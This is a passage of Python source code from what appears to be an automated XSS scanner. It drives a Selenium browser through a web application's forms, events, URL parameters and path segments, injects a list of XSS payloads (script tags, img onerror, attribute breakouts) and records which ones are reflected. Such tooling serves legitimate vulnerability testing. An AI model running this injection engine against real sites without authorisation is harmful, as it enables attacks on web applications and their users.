        print(bcolors.OKGREEN+"--------------------------------"+bcolors.ENDC)
        successful_xss = set()

        xss_payloads = self.get_payloads()

        print(bcolors.OKGREEN+"Will try to attack vector "+str(vector_edge)+bcolors.ENDC)
        for payload_template in xss_payloads:
            (lookup_id, payload) = self.arm_payload(payload_template)
            # Arm the payload
            event = vector_edge.value.method_data

            self.use_payload(lookup_id, (vector_edge, "payload_parameter", event.event, payload))

            # Launch!
            follow_edge(driver, self.graph, vector_edge)

            try:
                if event.event == "oninput" or event.event == "input":
                    el = driver.find_element(By.XPATH, event.addr)
                    el.clear()
                    el.send_keys(payload)
                    el.send_keys(Keys.RETURN)
                    logging.info("oninput %s" % driver.find_element(By.XPATH, event.addr))
                if event.event == "oncompositionstart" or event.event == "compositionstart":
                    el = driver.find_element(By.XPATH, event.addr)
                    el.click()
                    el.clear()
                    el.send_keys(payload)
                    el.send_keys(Keys.RETURN)
                    logging.info("oncompositionstart %s" % driver.find_element(By.XPATH, event.addr))

                else:
                    logging.error("Could not attack event.event %s" % event.event)
            except Exception as e:
                print(bcolors.OKGREEN+"PROBLEM ATTACKING EVENT: "+str(event)+bcolors.ENDC)
                logging.error("Can't attack event " + str(event) + " " + str(e).splitlines()[0])

            # Inspect
            inspect_result = self.inspect_attack(vector_edge)
            if inspect_result:
                successful_xss = successful_xss.union(inspect_result)
                if lookup_id in inspect_result:
                    logging.info("Found injection, don't test all")
                    break

        return successful_xss

    def attack_get(self, driver, vector):

        successful_xss = set()

        if "#" in vector and not "#####" in vector:
            driver.get("http://localhost")
        driver.get(vector)
        inspect_result = self.inspect_attack(vector)
        if inspect_result:
            successful_xss = successful_xss.union(inspect_result)

        xss_payloads = self.get_payloads()

        purl = urlparse(vector)
        print(bcolors.OKGREEN+str(purl)+bcolors.ENDC)
        parameters = []
        if purl.query and "&" in purl.query:
            parameters = purl.query.split("&")
        if purl.query and ";" in purl.query:
            parameters = purl.query.split(";")
        for parameter in parameters:
            if parameter:
                for payload_template in xss_payloads:

                    (lookup_id, payload) = self.arm_payload(payload_template)

                    # Look for ?a=b&c=d
                    if "=" in parameter:
                        # Only split on first to allow ?a=b=C => (a, b=c)
                        (key, value) = parameter.split("=", 1)
                    # Singleton parameters ?x&y&z
                    else:
                        (key, value) = (parameter, "")

                    value = payload

                    self.use_payload(lookup_id, (vector, "payload_parameter", key, payload))

                    attack_query = purl.query.replace(parameter, key + "=" + value)
                    #print("--Attack query: ", attack_query)

                    attack_vector = vector.replace(purl.query, attack_query)
                    print(bcolors.OKGREEN+"--Attack vector: "+str(attack_vector)+bcolors.ENDC)

                    if "#" in attack_vector and not "#####" in attack_vector:
                        driver.get("http://localhost")
                    driver.get(attack_vector)

                    # Inspect
                    inspect_result = self.inspect_attack(vector)
                    if inspect_result:
                        successful_xss = successful_xss.union(inspect_result)
                        if lookup_id in inspect_result:
                            logging.info("Found injection, don't test all")
                            break

        path_parts = purl.path.strip("/").split("/")
        for part in path_parts:
            if part:
                for payload_template in xss_payloads:
                    (lookup_id, payload) = self.arm_payload(payload_template)

                    attack_query = ''
                    if "=" in part:
                        (key, value) = part.split("=", 1)
                        value = payload
                        self.use_payload(lookup_id, (vector, "payload_parameter", key, payload))
                        attack_query = purl.path.replace(part, key + "=" + value)
                    elif ":" in part:
                        (key, value) = part.split(":", 1)
                        value = payload
                        self.use_payload(lookup_id, (vector, "payload_parameter", key, payload))
                        attack_query = purl.path.replace(part, key + ":" + value)
                    elif part.isdigit():
                        value = payload
                        self.use_payload(lookup_id, (vector, "payload_parameter", part, payload))
                        attack_query = purl.path.replace(part, value)

                    if attack_query:
                        attack_vector = vector.replace(purl.path, attack_query)
                        print(bcolors.OKGREEN+"--Attack vector: "+str(attack_vector)+bcolors.ENDC)
                        if "#" in attack_vector and not "#####" in attack_vector:
                            driver.get("http://localhost")
                        driver.get(attack_vector)

                        # Inspect
                        inspect_result = self.inspect_attack(vector)
                        if inspect_result:
                            successful_xss = successful_xss.union(inspect_result)
                            if lookup_id in inspect_result:
                                logging.info("Found injection, don't test all")
                                break

        return successful_xss

    def xss_find_state(self, driver, edge):
        graph = self.graph
        path = rec_find_path(graph, edge)

        for edge_in_path in path:
            method = edge_in_path.value.method
            method_data = edge_in_path.value.method_data
            logging.info("find_state method %s" % method)
            if method == "form":
                form = method_data
                try:
                    form_fill(driver, form)
                except Exception as e:
                    logging.error("NO FORM FILL IN xss_find_state " + str(e).splitlines()[0])

    def fix_form(self, form, payload_template, safe_attack):
        alert_text = "%RAND"

        # Optimization. If aggressive fuzzing doesn't add any new
        # types of elements then skip it
        only_aggressive = ["hidden", "radio", "checkbox", "select", "file"]
        need_aggressive = False
        for parameter in form.inputs:
            if parameter.itype in only_aggressive:
                need_aggressive = True
                break

        lookup_ids = []

        for parameter in form.inputs:
            (lookup_id, payload) = self.arm_payload(payload_template)
            lookup_ids.append(lookup_id)
            if safe_attack:
                # SAFE.
                logging.debug("Starting SAFE attack")
                # List all injectable input types text, textarea, etc.
                if parameter.itype in ["text", "textarea", "password", "iframe", "search"]:
                    # Arm the payload
                    form.inputs[parameter].value = payload
                    self.use_payload(lookup_id, (form, "payload_parameter", parameter, payload))
                else:
                    logging.info("SAFE: Ignore parameter " + str(parameter))
            elif need_aggressive:
                # AGGRESSIVE
                logging.debug("Starting AGGRESSIVE attack")
                # List all injectable input types text, textarea, etc.
                if parameter.itype in ["text", "textarea", "password", "hidden", "iframe", "search"]:
                    # Arm the payload
                    form.inputs[parameter].value = payload
                    self.use_payload(lookup_id, (form, "payload_parameter", parameter, payload))
                elif parameter.itype in ["radio", "checkbox", "select"]:
                    form.inputs[parameter].override_value = payload
                    self.use_payload(lookup_id, (form, "payload_parameter", parameter, payload))
                elif parameter.itype == "file":
                    file_payload_template = "<img src=x onerror=xss(%RAND)>"
                    (lookup_id, payload) = self.arm_payload(file_payload_template)
                    form.inputs[parameter].value = payload
                    self.use_payload(lookup_id, (form, "payload_parameter", parameter, payload))
                else:
                    logging.info("AGGRESSIVE: Ignore parameter " + str(parameter))

        return form, lookup_ids

    def get_payloads(self):
        alert_text = "%RAND"
        xss_payloads = ["<script>xss(" + alert_text + ")</script>",
                        "\"'><script>xss(" + alert_text + ")</script>",
                        '<img src="x" onerror="xss(' + alert_text + ')">',
                        '<a href="" jaekpot-attribute="' + alert_text + '">jaekpot</a>',
                        'x" jaekpot-attribute="' + alert_text + '" fix=" ',
                        'x" onerror="xss(' + alert_text + ')"',
                        "</title></option><script>xss(" + alert_text + ")</script>",
                        ]
        return xss_payloads

    def arm_payload(self, payload_template):
        lookup_id = str(random.randint(1, 100000000))
        payload = payload_template.replace("%RAND", lookup_id)

        return lookup_id, payload

    # Adds it to the attack table
    def use_payload(self, lookup_id, vector_with_payload):
        self.attack_lookup_table[str(lookup_id)] = {"injected": vector_with_payload,
                                                    "reflected": set()}

    # Checks for successful injections
    def inspect_attack(self, vector_edge):
        successful_xss = set()

        # attribute injections
        attribute_injects = self.driver.find_elements(By.XPATH, "//*[@jaekpot-attribute]")
        for attribute in attribute_injects:
            try:
                lookup_id = attribute.get_attribute("jaekpot-attribute")
                successful_xss.add(lookup_id)
                self.reflected_payload(lookup_id, vector_edge)
            except Exception as e:
                print(bcolors.OKGREEN+"PROBLEM INSPECTING ATTRIBUTE"+bcolors.ENDC)
                logging.error("Can't inspect attribute " + str(attribute) + " " + str(e).splitlines()[0])

        xsses_json = self.driver.execute_script("return JSON.stringify(xss_array)")
        lookup_ids = json.loads(xsses_json)

        for lookup_id in lookup_ids:
            successful_xss.add(lookup_id)
            self.reflected_payload(lookup_id, vector_edge)

        # Save successful attacks to file
        if successful_xss:
            app_result_path = os.path.join(RESULT_DIR, self.app_name)
            f = open(os.path.join(app_result_path, "successful_injections-" + self.session_id + ".txt"), "a+")
            for xss in successful_xss:
                attack_entry = self.get_table_entry(xss)
                if attack_entry:
                    print(bcolors.OKGREEN+"----------------------------"+bcolors.ENDC)
                    print(bcolors.OKGREEN+"Found vulnerability: "+str(attack_entry)+bcolors.ENDC)
                    print(bcolors.OKGREEN+"----------------------------"+bcolors.ENDC)
                    simple_entry = {'reflected': str(attack_entry['reflected']),
                                    'injected': str(attack_entry['injected'])}

                    try:
                        f.write(json.dumps(simple_entry) + "\n")
                    except Exception as e:
                        logging.error("Error while dumping successful injections: " + str(e))
                        print(bcolors.OKGREEN+"Error while dumping successful injections: "+str(e)+bcolors.ENDC)

        return successful_xss

    def reflected_payload(self, lookup_id, location):
        if str(lookup_id) in self.attack_lookup_table:
            #self.attack_lookup_table[str(lookup_id)]["reflected"].append((self.driver.current_url, location))
            self.attack_lookup_table[str(lookup_id)]["reflected"].add((self.driver.current_url, location))
        else:
            logging.warning("Could not find lookup_id %s, perhaps from an older attack session?" % lookup_id)

    # Surprisingly tricky to get the string/int types right for numeric ids...
    def get_table_entry(self, lookup_id):
        if lookup_id in self.attack_lookup_table:
            return self.attack_lookup_table[lookup_id]
        if str(lookup_id) in self.attack_lookup_table:
            return self.attack_lookup_table[str(lookup_id)]

        logging.warning("Could not find lookup_id %s " % lookup_id)
        return None

    def execute_path(self, driver, path):
        graph = self.graph

        for edge_in_path in path:
            method = edge_in_path.value.method
            method_data = edge_in_path.value.method_data
            logging.info("find_state method " + str(method) + " " +str(method_data))
            if method == "get":
                if allow_edge(graph, edge_in_path):
                    if "#" in edge_in_path.n2.value.url and not "#####" in edge_in_path.n2.value.url:
                        driver.get("http://localhost")
                    driver.get(edge_in_path.n2.value.url)
                    self.inspect_attack(edge_in_path)
                else:
                    logging.warning("Not allowed to get: " + str(edge_in_path.n2.value.url))
                    return False
            elif method == "form":
                form = method_data
                try:
                    fill_result = form_fill(driver, form)
                    self.inspect_attack(edge_in_path)
                    if not fill_result:
                        logging.warning("Failed to fill form:" + str(form))
                        return False
                except Exception as e:
                    print(bcolors.OKGREEN+str(e).splitlines()[0]+bcolors.ENDC)
                    logging.error("Failed to fill form: " + str(form))
                    logging.error(str(e).splitlines()[0])
                    return False
            elif method == "event":
                event = method_data
                execute_event(driver, event)
                remove_alerts(driver)
                self.inspect_attack(edge_in_path)
            elif method == "iframe":
                logging.info("iframe, do find_state")
                if not find_state(driver, graph, edge_in_path, False):
                    logging.warning("Could not enter iframe" + str(edge_in_path))
                    return False

                self.inspect_attack(edge_in_path)
            elif method == "javascript":
                js_code = edge_in_path.n2.value.url
                if "#####" in js_code:
                    js_code = js_code.split("#####")[1]
                js_code = js_code[11:]
                text = ''
                if "text:" in js_code:
                    text = js_code.split("text:")[1]
                    js_code = js_code.split("text:")[0]
                if "id:" in js_code:
                    id = js_code.split("id:")[1]
                    js_code = id
                    if " " in js_code:
                        js_code = js_code.split(" ")[0]
                    try:
                        els = driver.find_elements(By.ID, js_code)
                        for el in els:
                            try:
                                el_id = el.get_attribute("id")
                                el_text = get_element_text(driver, el)
                                if el_id == id and el_text == text:
                                    el.click()
                                    logging.info("Clicking on " + id)
                                    break
                            except NoSuchElementException as e:
                                print(bcolors.OKGREEN+"Could not find element to click on "+js_code+bcolors.ENDC)
                                logging.error("Could not find element to click on "+js_code)
                            except Exception as e:
                                logging.error("Could not click on "+js_code+" "+str(e).splitlines()[0])
                    except Exception as e:
                        print(bcolors.OKGREEN+"execute javascript " + js_code + " error: "+str(e).splitlines()[0]+bcolors.ENDC)
                elif "class_name:" in js_code:
                    class_name = js_code.split("class_name:")[1]
                    js_code = class_name
                    if " " in js_code:
                        js_code = js_code.split(" ")[0]
                    try:
                        els = driver.find_elements(By.CLASS_NAME, js_code)
                        for el in els:
                            try:
                                el_class_name = el.get_attribute("class")
                                el_text = get_element_text(driver, el)
                                if el_class_name == class_name and el_text == text:
                                    el.click()
                                    logging.info("Clicking on " + el_class_name)
                                    break
                            except NoSuchElementException as e:
                                print(bcolors.OKGREEN + "Could not find element to click on " + js_code + bcolors.ENDC)
                                logging.error("Could not find element to click on " + js_code)
                            except Exception as e:
                                logging.error("Could not click on " + js_code + " " + str(e).splitlines()[0])
                    except Exception as e:
                        print(bcolors.OKGREEN + "execute javascript " + js_code + " error: " + str(e).splitlines()[0] + bcolors.ENDC)
                        
                        logging.error("execute javascript " + js_code + " error: " + str(e).splitlines()[0])
                elif "onclick:" in js_code:
                    onclick = js_code.split("onclick:")[1]
                    js_code = onclick
                    if " " in js_code:
                        js_code = js_code.split(" ")[0]
                    try:
                        els = driver.find_elements(By.XPATH, "//a[starts-with(@href, 'javascript:')]")
                        for el in els:
                            try:
                                el_onclick = el.get_attribute("onclick")
                                el_text = get_element_text(driver, el)
                                if el_onclick == onclick and el_text == text:
                                    el.click()
                                    logging.info("Clicking on " + onclick)
                                    break
                            except NoSuchElementException as e:
                                print(bcolors.OKGREEN + "Could not find element to click on " + js_code + bcolors.ENDC)
                                logging.error("Could not find element to click on " + js_code)
                            except Exception as e:
                                logging.error("Could not click on " + js_code + " " + str(e).splitlines()[0])
                    except Exception as e:
                        print(bcolors.OKGREEN + "execute javascript " + js_code + " error: " + str(e).splitlines()[0] + bcolors.ENDC)
                        logging.error("execute javascript " + js_code + " error: " + str(e).splitlines()[0])
                else:
                    try:
                        driver.execute_script(js_code)
                        self.inspect_attack(edge_in_path)
                    except Exception as e:
                        print(bcolors.OKGREEN+str(e).splitlines()[0]+bcolors.ENDC)
                        
                        logging.error("Error executing javascript: " + js_code)
                        logging.error(str(e).splitlines()[0])
                        return False
        return True

    def get_tracker(self):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(8))

    def use_tracker(self, tracker, vector_with_payload):
        self.io_graph[tracker] = {"injected": vector_with_payload,
                                  "reflected": set()}

    def inspect_tracker(self, vector_edge):
        try:
            body_text = get_element_text(self.driver, self.driver.find_element(By.TAG_NAME, "body"))

            for tracker in self.io_graph:
                if tracker in body_text:
                    self.io_graph[tracker]['reflected'].add(vector_edge)
                    print(bcolors.OKGREEN+"Found from tracker! " + str(vector_edge)+bcolors.ENDC)
                    logging.info("Found from tracker! " + str(vector_edge))

                    prev_edge = self.io_graph[tracker]['injected'][0]
                    attackable = prev_edge.value.method_data.attackable()
                    if attackable:
                        self.path_attack_form(self.driver, prev_edge, vector_edge)
        except Exception as e:
            print(bcolors.OKGREEN+"Failed to find tracker in body_text"+bcolors.ENDC)
            logging.error("Failed to find tracker in body_text")
            logging.error(str(e).splitlines()[0])

    def track_form(self, driver, vector_edge):
        successful_xss = set()

        graph = self.graph
        path = rec_find_path(graph, vector_edge)

        form_edges = []
        for edge in path:
            if edge.value.method == "form":
                form_edges.append(edge)

        try:
            for form_edge in form_edges:
                form = form_edge.value.method_data
                tracker = self.get_tracker()
                for parameter in form.inputs:
                    if parameter.itype == "text" or parameter.itype == "textarea" or parameter.itype == "iframe" or parameter.itype == "search":
                        form.inputs[parameter].value = tracker
                        self.use_tracker(tracker, (form_edge, "payload_parameter", parameter, tracker))

            self.execute_path(driver, path)

            # Inspect
            self.inspect_tracker(vector_edge)
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM TRACKING FORM: "+str(vector_edge)+bcolors.ENDC)
            logging.error("Can't track form " + str(vector_edge) + " " + str(e).splitlines()[0])

        return successful_xss

    def path_attack_form(self, driver, vector_edge, check_edge=None):

        logging.info("ATTACKING VECTOR_EDGE: " + str(vector_edge))
        successful_xss = set()

        graph = self.graph
        path = rec_find_path(graph, vector_edge)
        self.execute_path(driver, path)

        logging.info("PATH LENGTH: " + str(len(path)))
        forms = []
        for edge in path:
            if edge.value.method == "form":
                forms.append(edge.value.method_data)

        # Safe fix form
        payloads = self.get_payloads()
        for payload_template in payloads:
            for form in forms:
                form, lookup_ids = self.fix_form(form, payload_template, True)

            execute_result = self.execute_path(driver, path)
            if not execute_result:
                logging.warning("Early break attack on " + str(vector_edge))
                return False
            if check_edge:
                logging.info("check_edge defined from tracker " + str(check_edge))
                follow_edge(driver, graph, check_edge)
            # Inspect
            inspect_result = self.inspect_attack(vector_edge)
            if inspect_result:
                successful_xss = successful_xss.union(inspect_result)
                for lookup_id in lookup_ids:
                    if lookup_id in inspect_result:
                        print(bcolors.OKGREEN+"Found one, quit.."+bcolors.ENDC)
                        return successful_xss

        # Aggressive fix form
        payloads = self.get_payloads()
        for payload_template in payloads:
            for form in forms:
                form, lookup_ids = self.fix_form(form, payload_template, False)
            execute_result = self.execute_path(driver, path)
            if not execute_result:
                logging.warning("Early break attack on " + str(vector_edge))
                return False
            if check_edge:
                logging.info("check_edge defined from tracker " + str(check_edge))
                follow_edge(driver, graph, check_edge)
            # Inspect
            inspect_result = self.inspect_attack(vector_edge)
            if inspect_result:
                successful_xss = successful_xss.union(inspect_result)
                for lookup_id in lookup_ids:
                    if lookup_id in inspect_result:
                        print(bcolors.OKGREEN+"Found one, quit.."+bcolors.ENDC)
                        return successful_xss

        return successful_xss

    def attack_ui_form(self, driver, vector_edge):

        successful_xss = set()
        graph = self.graph

        xss_payloads = self.get_payloads()
        for payload_template in xss_payloads:
            (lookup_id, payload) = self.arm_payload(payload_template)
            # Arm the payload
            ui_form = vector_edge.value.method_data

            print(bcolors.OKGREEN+"Attacking"+str(ui_form)+"with"+str(payload)+bcolors.ENDC)

            self.use_payload(lookup_id, (vector_edge, "payload_parameter", ui_form, payload))

            # Launch!
            follow_edge(driver, self.graph, vector_edge)

            try:
                for source in ui_form.sources:
                    source['value'] = payload
                ui_form_fill(driver, ui_form)
            except Exception as e:
                print(bcolors.OKGREEN+"PROBLEM ATTACKING ui form: "+str(ui_form))
                logging.error("Can't attack event " + str(ui_form) + " " + str(e).splitlines()[0])

            # Inspect
            inspect_result = self.inspect_attack(vector_edge)
            if inspect_result:
                successful_xss = successful_xss.union(inspect_result)
                if lookup_id in inspect_result:
                    logging.info("Found injection, don't test all")
                    break

        return successful_xss

    def attack(self):
        driver = self.driver
        successful_xss = set()

        vectors = self.extract_vectors(False, False)

        start_time = time.time()

        try:
            forms_to_attack = [(vector_type, vector) for (vector_type, vector) in vectors if vector_type == "form"]
            form_c = 0
            for (vector_type, vector) in forms_to_attack:
                try:
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.max_reply_time:
                        logging.info("Max reply time reached, stopping")
                        break
                    print(bcolors.OKGREEN + "Progress (forms): " + str(form_c) + "/" + str(
                        len(forms_to_attack)) + bcolors.ENDC)
                    if vector_type == "form":
                        form_xss = self.path_attack_form(driver, vector)
                        if form_xss:
                            # Save to file
                            app_result_path = os.path.join(RESULT_DIR, self.app_name)
                            f = open(os.path.join(app_result_path, "form_xss.txt"), "a+")
                            for xss in form_xss:
                                if xss in self.attack_lookup_table:
                                    f.write(str(self.attack_lookup_table) + "\n")

                            successful_xss = successful_xss.union(form_xss)
                        else:
                            logging.error("Failed to attack form " + str(vector))
                    form_c += 1
                except Exception as e:
                    print(bcolors.OKGREEN + "PROBLEM ATTACKING FORM" + bcolors.ENDC)
                    logging.error("Can't attack form " + str(e).splitlines()[0])
        except Exception as e:
            print(bcolors.OKGREEN + "PROBLEM ATTACKING FORMS" + bcolors.ENDC)
            logging.error("Can't attack forms " + str(e).splitlines()[0])

        try:
            # Try to attack vectors
            events_to_attack = [(vector_type, vector) for (vector_type, vector) in vectors if vector_type == "event"]
            event_c = 0
            for (vector_type, vector) in events_to_attack:
                try:
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.max_reply_time:
                        logging.info("Max reply time reached, stopping")
                        break
                    print(bcolors.OKGREEN+"Progress (events): "+str(event_c)+"/"+str(len(events_to_attack))+bcolors.ENDC)
                    if vector_type == "event":
                        event_xss = self.attack_event(driver, vector)
                        successful_xss = successful_xss.union(event_xss)
                    event_c += 1
                except Exception as e:
                    print(bcolors.OKGREEN+"PROBLEM ATTACKING EVENT"+bcolors.ENDC)
                    logging.error("Can't attack event " + str(e).splitlines()[0])
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM ATTACKING EVENTS"+bcolors.ENDC)
            logging.error("Can't attack events " + str(e).splitlines()[0])

        try:
            gets_to_attack = [(vector_type, vector) for (vector_type, vector) in vectors if vector_type == "get"]
            get_c = 0
            for (vector_type, vector) in gets_to_attack:
                try:
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.max_reply_time:
                        logging.info("Max reply time reached, stopping")
                        break
                    print(bcolors.OKGREEN+"Progress (get): "+str(get_c)+"/"+str(len(gets_to_attack))+bcolors.ENDC)
                    logging.info("Progress (get): " + str(get_c) + "/" + str(len(gets_to_attack)))
                    if vector_type == "get":
                        get_xss = self.attack_get(driver, vector)
                        successful_xss = successful_xss.union(get_xss)
                    get_c += 1
                except Exception as e:
                    print(bcolors.OKGREEN+"PROBLEM ATTACKING GET"+bcolors.ENDC)
                    logging.error("Can't attack get " + str(e).splitlines()[0])
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM ATTACKING GETS"+bcolors.ENDC)
            logging.error("Can't attack gets " + str(e).splitlines()[0])

        try:
            # Quickly check for stored.
            quick_xss = self.quick_check_xss(driver, vectors, start_time)
            successful_xss = successful_xss.union(quick_xss)
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM QUICK CHECK"+bcolors.ENDC)
            logging.error("Can't quick check " + str(e).splitlines()[0])

        print(bcolors.OKGREEN+"----------------------------------"+bcolors.ENDC)
        print(bcolors.OKGREEN+"Successful attacks: "+str(len(successful_xss))+bcolors.ENDC)
        print(bcolors.OKGREEN+"----------------------------------"+bcolors.ENDC)

        app_result_path = os.path.join(RESULT_DIR, self.app_name)
        f = open(os.path.join(app_result_path, "successful_xss.txt"), "w")
        f.write(str(successful_xss))
        f = open(os.path.join(app_result_path, "attack_lookup_table.txt"), "w")
        f.write(str(self.attack_lookup_table))

        print(bcolors.OKGREEN+"ATTACK TABLE\n\n\n\n"+bcolors.ENDC)

        try:
            for (k, v) in self.attack_lookup_table.items():
                try:
                    if v["reflected"]:
                        print(bcolors.OKGREEN+str(k)+" "+str(v)+bcolors.ENDC)
                        print(bcolors.OKGREEN+"--------------------------------------------"+bcolors.ENDC)
                except Exception as e:
                    print(bcolors.OKGREEN+"PROBLEM PRINTING ATTACK TABLE"+bcolors.ENDC)
                    logging.error("Can't print attack table " + str(e).splitlines()[0])
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM PRINTING ATTACK TABLE"+bcolors.ENDC)
            logging.error("Can't print attack table " + str(e).splitlines()[0])

    def attack_delete(self):
        driver = self.driver
        successful_xss = set()

        vectors = self.extract_vectors(True, False)

        start_time = time.time()

        try:
            # Try to attack vectors
            events_to_attack = [(vector_type, vector) for (vector_type, vector) in vectors if vector_type == "event"]
            event_c = 0
            for (vector_type, vector) in events_to_attack:
                try:
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.max_reply_time:
                        logging.info("Max reply time reached, stopping")
                        break
                    print(bcolors.OKGREEN+"Progress (events): "+str(event_c)+"/"+str(len(events_to_attack))+bcolors.ENDC)
                    if vector_type == "event":
                        event_xss = self.attack_event(driver, vector)
                        successful_xss = successful_xss.union(event_xss)
                    event_c += 1
                except Exception as e:
                    print(bcolors.OKGREEN+"PROBLEM ATTACKING EVENT"+bcolors.ENDC)
                    logging.error("Can't attack event " + str(e).splitlines()[0])
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM ATTACKING EVENTS"+bcolors.ENDC)
            logging.error("Can't attack events " + str(e).splitlines()[0])

        try:
            forms_to_attack = [(vector_type, vector) for (vector_type, vector) in vectors if vector_type == "form"]
            form_c = 0
            for (vector_type, vector) in forms_to_attack:
                try:
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.max_reply_time:
                        logging.info("Max reply time reached, stopping")
                        break
                    print(bcolors.OKGREEN+"Progress (forms): "+str(form_c)+"/"+str(len(forms_to_attack))+bcolors.ENDC)
                    if vector_type == "form":
                        form_xss = self.path_attack_form(driver, vector)
                        if form_xss:
                            # Save to file
                            app_result_path = os.path.join(RESULT_DIR, self.app_name)
                            f = open(os.path.join(app_result_path, "form_xss_delete.txt"), "a+")
                            for xss in form_xss:
                                if xss in self.attack_lookup_table:
                                    f.write(str(self.attack_lookup_table) + "\n")

                            successful_xss = successful_xss.union(form_xss)
                        else:
                            logging.error("Failed to attack form " + str(vector))
                    form_c += 1
                except Exception as e:
                    print(bcolors.OKGREEN+"PROBLEM ATTACKING FORM"+bcolors.ENDC)
                    logging.error("Can't attack form " + str(e).splitlines()[0])
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM ATTACKING FORMS"+bcolors.ENDC)
            logging.error("Can't attack forms " + str(e).splitlines()[0])

        try:
            gets_to_attack = [(vector_type, vector) for (vector_type, vector) in vectors if vector_type == "get"]
            get_c = 0
            for (vector_type, vector) in gets_to_attack:
                try:
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.max_reply_time:
                        logging.info("Max reply time reached, stopping")
                        break
                    print(bcolors.OKGREEN+"Progress (get): "+str(get_c)+"/"+str(len(gets_to_attack))+bcolors.ENDC)
                    logging.info("Progress (get): " + str(get_c) + "/" + str(len(gets_to_attack)))
                    if vector_type == "get":
                        get_xss = self.attack_get(driver, vector)
                        successful_xss = successful_xss.union(get_xss)
                    get_c += 1
                except Exception as e:
                    print(bcolors.OKGREEN+"PROBLEM ATTACKING GET"+bcolors.ENDC)
                    logging.error("Can't attack get " + str(e).splitlines()[0])
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM ATTACKING GETS"+bcolors.ENDC)
            logging.error("Can't attack gets " + str(e).splitlines()[0])

        try:
            # Quickly check for stored.
            quick_xss = self.quick_check_xss(driver, vectors, start_time)
            successful_xss = successful_xss.union(quick_xss)
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM QUICK CHECK"+bcolors.ENDC)
            logging.error("Can't quick check " + str(e).splitlines()[0])

        print(bcolors.OKGREEN+"----------------------------------"+bcolors.ENDC)
        print(bcolors.OKGREEN+"Successful attacks: "+str(len(successful_xss))+bcolors.ENDC)
        print(bcolors.OKGREEN+"----------------------------------"+bcolors.ENDC)

        app_result_path = os.path.join(RESULT_DIR, self.app_name)
        f = open(os.path.join(app_result_path, "successful_xss_delete.txt"), "w")
        f.write(str(successful_xss))
        f = open(os.path.join(app_result_path, "attack_lookup_table_delete.txt"), "w")
        f.write(str(self.attack_lookup_table))

        print(bcolors.OKGREEN+"ATTACK TABLE\n\n\n\n"+bcolors.ENDC)

        try:
            for (k, v) in self.attack_lookup_table.items():
                if v["reflected"]:
                    print(bcolors.OKGREEN+str(k)+" "+str(v)+bcolors.ENDC)
                    print(bcolors.OKGREEN+"--------------------------------------------"+bcolors.ENDC)
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM PRINTING ATTACK TABLE"+bcolors.ENDC)
            logging.error("Can't print attack table " + str(e).splitlines()[0])

    def attack_blocking(self):
        driver = self.driver
        successful_xss = set()

        vectors = self.extract_vectors(False, True)

        start_time = time.time()

        try:
            # Try to attack vectors
            events_to_attack = [(vector_type, vector) for (vector_type, vector) in vectors if vector_type == "event"]
            event_c = 0
            for (vector_type, vector) in events_to_attack:
                try:
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.max_reply_time:
                        logging.info("Max reply time reached, stopping")
                        break
                    print(bcolors.OKGREEN+"Progress (events): "+str(event_c)+"/"+str(len(events_to_attack))+bcolors.ENDC)
                    if vector_type == "event":
                        self.retry_login(driver, self.graph)
                        event_xss = self.attack_event(driver, vector)
                        successful_xss = successful_xss.union(event_xss)
                    event_c += 1
                except Exception as e:
                    print(bcolors.OKGREEN+"PROBLEM ATTACKING EVENT"+bcolors.ENDC)
                    logging.error("Can't attack event " + str(e).splitlines()[0])
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM ATTACKING EVENTS"+bcolors.ENDC)
            logging.error("Can't attack events " + str(e).splitlines()[0])

        try:
            forms_to_attack = [(vector_type, vector) for (vector_type, vector) in vectors if vector_type == "form"]
            form_c = 0
            for (vector_type, vector) in forms_to_attack:
                try:
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.max_reply_time:
                        logging.info("Max reply time reached, stopping")
                        break
                    print(bcolors.OKGREEN+"Progress (forms): "+str(form_c)+"/"+str(len(forms_to_attack))+bcolors.ENDC)
                    if vector_type == "form":
                        self.retry_login(driver, self.graph)
                        form_xss = self.path_attack_form(driver, vector)
                        if form_xss:
                            # Save to file
                            app_result_path = os.path.join(RESULT_DIR, self.app_name)
                            f = open(os.path.join(app_result_path, "form_xss_delete.txt"), "a+")
                            for xss in form_xss:
                                if xss in self.attack_lookup_table:
                                    f.write(str(self.attack_lookup_table) + "\n")

                            successful_xss = successful_xss.union(form_xss)
                        else:
                            logging.error("Failed to attack form " + str(vector))
                    form_c += 1
                except Exception as e:
                    print(bcolors.OKGREEN+"PROBLEM ATTACKING FORM"+bcolors.ENDC)
                    logging.error("Can't attack form " + str(e).splitlines()[0])
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM ATTACKING FORMS"+bcolors.ENDC)
            logging.error("Can't attack forms " + str(e).splitlines()[0])

        try:
            gets_to_attack = [(vector_type, vector) for (vector_type, vector) in vectors if vector_type == "get"]
            get_c = 0
            for (vector_type, vector) in gets_to_attack:
                try:
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.max_reply_time:
                        logging.info("Max reply time reached, stopping")
                        break
                    print(bcolors.OKGREEN+"Progress (get): "+str(get_c)+"/"+str(len(gets_to_attack))+bcolors.ENDC)
                    logging.info("Progress (get): " + str(get_c) + "/" + str(len(gets_to_attack)))
                    if vector_type == "get":
                        self.retry_login(driver, self.graph)
                        get_xss = self.attack_get(driver, vector)
                        successful_xss = successful_xss.union(get_xss)
                    get_c += 1
                except Exception as e:
                    print(bcolors.OKGREEN+"PROBLEM ATTACKING GET"+bcolors.ENDC)
                    logging.error("Can't attack get " + str(e).splitlines()[0])
